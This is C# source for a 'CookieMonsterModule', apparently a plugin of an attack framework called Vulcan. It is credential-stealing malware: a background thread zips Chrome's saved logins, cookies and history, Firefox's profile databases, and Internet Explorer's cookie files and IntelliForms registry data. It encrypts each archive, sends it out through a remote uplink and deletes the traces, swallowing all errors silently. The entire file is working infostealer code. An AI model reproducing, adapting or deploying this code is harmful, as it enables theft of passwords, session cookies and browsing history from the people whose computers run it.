using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using Ionic.Zip;
using Microsoft.Win32;
using Vulcan.Core;
using Vulcan.Core.Uplink;
using Vulcan.Core.PluginFramework;

namespace ModuleWatchee
{
    public class CookieMonsterModule : IAttackModule
    {
        private IVulcanUplink uplink;
        private Thread worker;

        public void InitModule(VulcanConfiguration config)
        {
            uplink = VulcanConfiguration.Instance.PrimaryUplink;
            worker = new Thread(() =>
            {
                tryToStealInternetExplorerFiles();
                tryToStealChromeData();
                tryToStealFirefoxData();
            });
            worker.IsBackground = true;
            worker.Start();
        }

        private void tryToStealChromeData()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
                if (Directory.Exists(path))
                {
                    string zf = Path.GetTempFileName() + ".zip";
                    using (ZipFile pk = new ZipFile(zf))
                    {
                        pk.AddFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data");
                        pk.AddFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data-journal");
                        pk.AddFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies");
                        pk.AddFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies-journal");
                        pk.AddFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\History");
                        pk.AddFile(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\History-journal");
                        pk.Save();
                    }
                    FileHelper.EncryptRSA(zf);

                    uplink.SendFile(zf, "Google Chrome");
                    uplink.SendFile(zf + ".key", "Google Chrome Key");

                    File.Delete(zf);
                    File.Delete(zf + ".key");
                }
            }
            catch
            {
            }
        }

        private void tryToStealFirefoxData()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox";
                if (Directory.Exists(path))
                {
                    string zf = Path.GetTempFileName() + ".zip";
                    using (ZipFile pk = new ZipFile(zf))
                    {
                        scanForFiles(pk, path, ".db");
                        scanForFiles(pk, path, ".sqlite");
                        pk.Save();
                    }
                    FileHelper.EncryptRSA(zf);

                    uplink.SendFile(zf, "Firefox");
                    uplink.SendFile(zf + ".key", "Firefox Key");

                    File.Delete(zf);
                    File.Delete(zf + ".key");
                }
            }
            catch
            {
            }
        }

        private void tryToStealInternetExplorerFiles()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Cookies";
                string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\INetCookies";
                StringBuilder accum = new StringBuilder();
                recursivelyAddKeys(accum, @"Software\Microsoft\Internet Explorer\IntelliForms");
                string passwd = Path.GetTempFileName();
                File.WriteAllText(passwd, accum.ToString());
                string zf = Path.GetTempFileName() + ".zip";
                using (ZipFile pk = new ZipFile(zf))
                {
                    pk.AddFile(passwd);
                    if (Directory.Exists(path))
                        scanForFiles(pk, path, ".txt");
                    if (Directory.Exists(path2))
                        scanForFiles(pk, path, ".txt");
                    pk.Save();
                }

                FileHelper.EncryptRSA(zf);

                uplink.SendFile(zf, "Internet Explorer");
                uplink.SendFile(zf + ".key", "Internet Explorer Key");

                File.Delete(zf);
                File.Delete(zf + ".key");
            }
            catch
            {
            }
        }

        private void recursivelyAddKeys(StringBuilder accum, string subkey)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(subkey);
            foreach (string v in key.GetValueNames())
            {
                object o = key.GetValue(v);
                if (o is byte[])
                {
                    accum.AppendFormat("{0}=", v);
                    foreach (byte b in ((byte[])o))
                        accum.Append(b.ToString("x2") + " ");
                    accum.AppendLine();
                }
                else
                    accum.AppendFormat("{0}={1}\n", v, key.GetValue(v));
            }
            foreach (string sub in key.GetSubKeyNames())
            {
                recursivelyAddKeys(accum, subkey + "\\" + sub);
            }
        }

        private void scanForFiles(ZipFile zip, string path, string ext)
        {
            foreach (string str in Directory.GetFiles(path))
            {
                if (str.ToLower().EndsWith(ext.ToLower()))
                    zip.AddFile(str);
            }
            foreach (string dir in Directory.GetDirectories(path))
                scanForFiles(zip, dir, ext);
        }

    }
}
